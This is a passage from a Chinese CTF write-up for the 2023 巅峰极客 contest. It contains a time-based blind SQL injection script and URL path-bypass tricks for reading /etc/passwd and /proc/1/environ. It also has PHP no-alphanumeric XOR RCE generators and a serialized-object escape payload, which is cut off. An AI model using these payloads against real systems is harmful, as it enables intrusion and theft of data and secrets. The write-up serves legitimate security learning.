alt="image-20230724105015874"></p><p><strong>直接让gpt来帮我们在原来的基础上进行修改</strong></p><p><img src="../images/image-20230724105451643.png" alt="image-20230724105451643"> </p><p><img src="../images/image-20230724105521195.png" alt="image-20230724105521195"></p><p>可以成功进行延时</p><p><strong>最终的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            burp0_url = <span class="string">&quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot;</span> \</span><br><span class="line">                        <span class="string">&quot;substr(group_concat(table_name),&#123;&#125;,1)) from information_schema.tables where table_schema=database()))=&#123;&#125; then (select sum(1) FROM &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.views D) else 1 end-- -&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">                <span class="comment">#Flllag</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(column_name),&#123;&#125;,1)) from information_schema.columns where table_name=&#x27;Flllag&#x27;))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line">                <span class="comment">#Flagg</span></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(Flagg),&#123;&#125;,1)) from Flllag))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line"></span><br><span class="line">            burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7,en-US;q=0.6&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">            r = requests.get(burp0_url, headers=burp0_headers, timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="comment"># time.sleep(1)</span></span><br><span class="line">            <span class="comment"># print(j,r.text)</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;kfrL9n0upSAOMvY8hcO8uLdYMo9mZjHY&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230724110506033.png" alt="image-20230724110506033"></p><p>这里解释一下这个<code>case when condition then result</code>  的意思</p><p>就是当<strong>查询内容</strong>满足这个<code>condition</code>的时候就会返回<code>result</code> </p><p><strong>上述代码的意思就是说匹配到的时候就会延时</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li>其实就是考察的是<strong>时间盲注</strong>  但是只是需要替换一些函数</li></ul><h2 id="hinder"><a href="#hinder" class="headerlink" title="hinder"></a>hinder</h2><p>这道题预期解其实是挺复杂的  但是这题存在非预期  (<strong>原因是出题人在运行完sh文件后没把该文件删除  导致出现了非预期)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目提示了 </span><br><span class="line">访问/hinder</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230725111811018.png" alt="image-20230725111811018"></p><p>没访问之前是可以看到这个网站的服务器是<code>java</code>的    (<strong>是个挺重要的信息</strong>)</p><p><img src="../images/image-20230725112023678.png" alt="image-20230725112023678"></p><p>这里话是有两个绕过方法</p><ul><li>一个是url编码  (<strong>因为这里是前端校验</strong>)</li><li>另一个是使用    <code>/;/hinder</code></li><li><code>/anything/../hinder/</code> <strong>绕过路径 (这样也行)</strong></li></ul><p><img src="../images/image-20230725112140700.png" alt="image-20230725112140700"></p><p>这里的话讲一下这个  <code>/;/hinder</code>  绕过的原理</p><p><img src="../images/image-20230725112306230.png" alt="image-20230725112306230"></p><p><img src="../images/image-20230725112342291.png" alt="image-20230725112342291"></p><p>其实这里的话就是实现任意文件读取了   (<strong>看到这个<code>action</code>的时候其实可以想到这个<code>struct2</code></strong>)</p><p>尝试读取一下<code>/etc/passwd</code></p><p><img src="../images/image-20230725113456496.png" alt="image-20230725113456496"></p><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a><strong>非预期解</strong></h3><p>尝试读取出题人常用的docker启动脚本   <strong>例如 <code>/run.sh  /start.sh</code></strong></p><p><img src="../images/1689930726240-f021d0b4-1312-46c6-8638-1a3398dd542f.png" alt="img"></p><p>然后读取该文件就行了 </p><p><img src="../images/1689930751274-96d92ed6-3259-4bcd-bdda-dc7be9aea343.png" alt="img"></p><p><strong>看到这些非预期解以后   以后读取文件的话可以尝试读取这两个地方的东西了</strong></p><ul><li><code>/proc/1/environ</code></li><li><code>/proc/1/cmdline</code></li><li><code>/run.sh  /start.sh 等等之类的docker启动常用脚本</code></li></ul><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><a href="https://www.yuque.com/dat0u/ctf/vl4hurp3yvqqsckz#BPCx1">巅峰极客2023 hinder</a></p><p>这个是使用的是<code>struct2</code>的漏洞来解的题</p><p>这里还没有一个完整的wp来看   所以先不写</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a><strong>unserialize</strong></h2><p><strong>启动脚本</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it -d -p 12345:80 -e FLAG=flag&#123;8382843b-d3e8-72fc-6625-ba5269953b23&#125; lxxxin/dfjk2023_unserialize</span></span><br></pre></td></tr></table></figure><p>访问  <code>/www.zip</code>  得到源码</p><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;bbbbbb&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bbbbbb&#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>(<strong>这里的话大佬应该能猜到是反序列化逃逸</strong>)      反正我没猜到…………</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$root</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line"><span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$login</span> = <span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>(<span class="variable">$root</span>, <span class="variable">$pwd</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>));</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(`Login First!`);location.href=`./index.php`;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">a</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$login</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>my.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x) &#123;</span><br><span class="line"><span class="variable">$preg_match</span> = <span class="string">&#x27;return preg_match(&quot;/[A-Za-z0-9]+/i&quot;, $this-&gt;x);&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="variable">$preg_match</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$preg_match</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;save_waf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$root</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$pwd</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$root</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;root = <span class="variable">$root</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;root);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;pwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;root) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;pwd)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello, <span class="subst">$this</span>-&gt;root&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>开始代码审计</strong></p><p><img src="../images/image-20230724162222075.png" alt="image-20230724162222075"></p><p><strong>首先是在<code>index.php</code>处进行序列化操作 </strong>   <strong>然后在用b函数进行替换操作</strong></p><p><img src="../images/image-20230724162404370.png" alt="image-20230724162404370"></p><p><strong>最后是在这个<code>login.php</code>处先将序列化字符串进行a函数替换  然后再进行反序列化</strong></p><p><strong>命令执行是在这个地方</strong></p><p><img src="../images/image-20230724162637962.png" alt="image-20230724162637962"></p><p>就是在<code>my.php</code>这个里面  其实就是无数字字母RCE  但是这不是关键  关键是如何进行<strong>序列化字符串逃逸</strong></p><p><strong>先使用之前羽师傅写的一个异或脚本来生成自己想要执行的命令</strong></p><p><strong>xor.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>xor.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>使用方法就是先使用php生成字典  然后再使用python来生成自己想要的命令</strong></p><p><img src="../images/image-20230724163944186.png" alt="image-20230724163944186"></p><p>然后开始构造链子</p><p><img src="../images/image-20230724164349115.png" alt="image-20230724164349115"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;pull_it&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;pull_itx&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;(&quot;</span> <span class="string">&quot;^&quot;</span>&#123;&#123;&#123;|``<span class="string">&quot;)(&quot;</span><span class="string">&quot;^&quot;</span>``| /`*<span class="string">&quot;);&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//没编码前</span></span><br><span class="line">O%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>pull_it%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>pull_it%<span class="number">00</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A41%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">08</span>%<span class="number">02</span>%<span class="number">08</span>%<span class="number">08</span>%<span class="number">05</span>%<span class="number">0</span>D%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>C%<span class="number">60</span>%<span class="number">60</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">03</span>%<span class="number">01</span>%<span class="number">08</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">06</span>%<span class="number">00</span>%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">60</span>%<span class="number">60</span>%<span class="number">7</span>C+%<span class="number">2</span>F%<span class="number">60</span>%<span class="number">2</span>A%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="comment">//编码后                                                 </span></span><br></pre></td></tr></table></figure><p><strong>因为这里的是因为不能传入这个<code>pull_it</code>这个类直接进行反序列化</strong></p><p><img src="../images/image-20230724190117444.png" alt="image-20230724190117444"></p><p><strong>所以说我们就得尝试进行字符逃逸  把这个序列化后的结果加进去</strong></p><p>开始逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=<span class="string">&quot;;s:5:&quot;</span>datou<span 